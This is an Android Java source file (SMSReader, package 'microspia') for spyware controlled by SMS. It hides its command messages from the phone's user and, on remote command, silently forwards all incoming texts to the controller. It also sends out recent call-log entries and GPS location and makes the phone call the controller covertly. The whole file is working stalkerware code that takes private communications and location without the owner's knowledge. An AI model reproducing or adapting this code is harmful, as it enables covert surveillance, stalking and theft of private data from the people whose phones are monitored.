package com.andreafortuna.microspia;

import java.sql.Date;
import java.text.SimpleDateFormat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

public class SMSReader extends BroadcastReceiver {
	
	private void inviaSMS(String numero, String messaggio) {
		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage(numero, null, messaggio, null, null);		
	}
	
	@Override
	public void onReceive(final Context context, Intent intent) {

		Bundle bundle = intent.getExtras();

		Object messages[] = (Object[]) bundle.get("pdus");

		// Verifico numero di inoltro
		SharedPreferences prefs = context.getSharedPreferences("Microspia",Context.MODE_PRIVATE);
		String numeroInoltro = prefs.getString("inoltro", "");
		
		Boolean inoltra = (numeroInoltro!="");
		


		SmsMessage smsMessage[] = new SmsMessage[messages.length];
		for (int n = 0; n < messages.length; n++) {
			smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
		}

		//Estraggo mittente
		final String mittente = smsMessage[0].getOriginatingAddress();
		//estraggo testo messaggio
		String testo_comando = smsMessage[0].getMessageBody().toString();
		
		// Verifico testo messaggio

		// Avvio inoltro SMS
		if (testo_comando.equals("inoltro on")) {
			this.abortBroadcast();			
			SharedPreferences.Editor editor = prefs.edit();
			editor.putString("inoltro", mittente.toString());
			editor.commit();
			inoltra = false;
			
			//Invio conferma
			String testo_messaggio = "Avvio inoltro a " + prefs.getString("inoltro", "");		
			inviaSMS(mittente, testo_messaggio);
			
			Log.v(this.getClass().getSimpleName(), testo_messaggio);
		}

		// Fermo inoltro SMS
		if (testo_comando.equals("inoltro off")) {
			this.abortBroadcast();				
			
			SharedPreferences.Editor editor = prefs.edit();
			editor.putString("inoltro", "");
			editor.commit();
			inoltra = false;
			
			//Invio conferma
			String testo_messaggio = "Fermo inoltro";
			inviaSMS(mittente, testo_messaggio);
			Log.v(this.getClass().getSimpleName(), testo_messaggio);
		}
		
		
		// Verifico stato telefono
		if (testo_comando.equals("stato")) {

			this.abortBroadcast();
			inoltra = false;
					
			// Leggo livello della batteria
			int livello = MicrospiaActivity.getBatteryLevel();

			String testo_messaggio = "Livello batteria: "
					+ String.valueOf(livello) + "%";
			
			inviaSMS(mittente, testo_messaggio);
			
			Log.v(this.getClass().getSimpleName(), testo_messaggio);
		}

		// Effettuo chiamata
		if (testo_comando.equals("chiamami")) {
			this.abortBroadcast();
			inoltra = false;					
			Intent callIntent = new Intent(Intent.ACTION_CALL);
			callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			callIntent.setData(Uri.parse("tel:" + mittente));
			context.startActivity(callIntent);
		}

		// Invio lista chiamate ricevute
		if (testo_comando.equals("chiamate")) {
			this.abortBroadcast();
			inoltra = false;						

			String[] strFields = { android.provider.CallLog.Calls.NUMBER,
					android.provider.CallLog.Calls.TYPE,
					android.provider.CallLog.Calls.CACHED_NAME,
					android.provider.CallLog.Calls.CACHED_NUMBER_TYPE,
					android.provider.CallLog.Calls.DATE };
			String strOrder = android.provider.CallLog.Calls.DATE + " DESC";

			Cursor mCallCursor = context.getContentResolver().query(
					android.provider.CallLog.Calls.CONTENT_URI, strFields,
					null, null, strOrder);

			String testo_messaggio = "";
			// get start of cursor
			if (mCallCursor.moveToFirst()) {

				// loop through cursor
				int conteggio = 0;
				do {
					String tipo_chiamata = "IN";
					if (mCallCursor.getInt(1) == 2)
						tipo_chiamata = "OUT";
					// Date data_chiamata=new Date(mCallCursor.getLong(4));
					SimpleDateFormat datePattern = new SimpleDateFormat(
							"dd/MM/yyyy hh:mm:ss");
					String data_chiamata = datePattern.format(new Date(
							mCallCursor.getLong(4)));

					testo_messaggio += tipo_chiamata + " " + data_chiamata
							+ "\n" + mCallCursor.getString(0) + "\n\n";
					conteggio++;
					if (conteggio > 2)
						break;
				} while (mCallCursor.moveToNext());

				inviaSMS(mittente, testo_messaggio);				
				Log.v(this.getClass().getSimpleName(), testo_messaggio);				
			}

		}

		// Invio posizione
		if (testo_comando.equals("posizione")) {
			this.abortBroadcast();
			inoltra = false;
		
	

			// Ottengo posizione

			final LocationManager locationManager = (LocationManager) context
					.getSystemService(Context.LOCATION_SERVICE);

			// Define a listener that responds to location updates
			LocationListener locationListener = new LocationListener() {
				public void onLocationChanged(Location location) {
					String testo_messaggio = "";

					testo_messaggio += "http://maps.google.com/?ll="
							+ location.getLatitude() + ","
							+ location.getLongitude();


					inviaSMS(mittente, testo_messaggio);
					Log.v(this.getClass().getSimpleName(), testo_messaggio);
					locationManager.removeUpdates(this);
				}

				public void onStatusChanged(String provider, int status,
						Bundle extras) {
				}

				public void onProviderEnabled(String provider) {
				}

				public void onProviderDisabled(String provider) {
				}
			};

			// Avvio il listener per l'invio dell'sms una volta ottenuta la
			// posizione

			// (Toast.makeText(context, "Cerco posizione (" +
			// locationManager.GPS_PROVIDER + ")...",
			// Toast.LENGTH_LONG)).show();
			Log.v(this.getClass().getSimpleName(), "Cerco posizione ("
					+ LocationManager.GPS_PROVIDER + ")...");

			// Verifico se disponibile una posizione recente
			Location lastKnownLocation = locationManager
					.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
			Log.v(this.getClass().getSimpleName(), "(POS)" + lastKnownLocation);
			if (lastKnownLocation == null) {
				locationManager.requestLocationUpdates(
						LocationManager.GPS_PROVIDER, 0, 0, locationListener);
			} else {
				// invio messaggio con ultima posizione				
				String testo_messaggio = "";
				testo_messaggio += "http://maps.google.com/?ll="
						+ lastKnownLocation.getLatitude() + ","
						+ lastKnownLocation.getLongitude();
								
				inviaSMS(mittente, testo_messaggio);
				Log.v(this.getClass().getSimpleName(), "(CACHED)"
						+ testo_messaggio);
			}

		}

		
		//Log.v(this.getClass().getSimpleName(), "inoltro:" + inoltra);
		//Se l'inoltro è attivo, allora invio il messaggio
		if (inoltra) {			
			String testo_messaggio = testo_comando + "\nDa:" + mittente;			
			inviaSMS(numeroInoltro, testo_messaggio);		
			Log.v(this.getClass().getSimpleName(), testo_messaggio);
			
		}
		
	}
}